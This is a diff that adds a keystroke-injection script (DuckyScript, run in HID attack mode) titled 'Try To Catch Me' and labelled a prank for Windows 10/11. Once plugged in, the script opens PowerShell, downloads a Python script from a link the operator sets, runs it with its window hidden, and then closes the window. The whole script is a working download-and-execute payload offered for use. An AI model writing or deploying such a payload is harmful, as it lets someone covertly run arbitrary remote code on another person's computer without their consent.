@@ -1,0 +1,32 @@
+####################################
+#                                  #
+# Title        : Try To Catch Me   #
+# Author       : Aleff             #
+# Version      : 1.0               #
+# Category     : Prank             #
+# Target       : Windows 10/11     #
+#                                  #
+####################################
+
+ATTACKMODE HID
+
+# Requirements:
+#     - Internet Connection
+
+# VARIABLES
+- Set your Python script link
+SCRIPT-PY-LINK='example.com'
+
+QUACK DELAY 1000
+QUACK GUI r
+QUACK DELAY 500
+QUACK STRING powershell
+QUACK ENTER
+QUACK DELAY 500
+QUACK STRING Invoke-WebRequest -Uri \"$SCRIPT-PY-LINK\" -OutFile \"script.py\"
+QUACK ENTER
+QUACK DELAY 500
+QUACK STRING Start-Process python.exe -ArgumentList \"script.py\" -WindowStyle Hidden
+QUACK ENTER
+QUACK DELAY 1000
+QUACK ALT F4
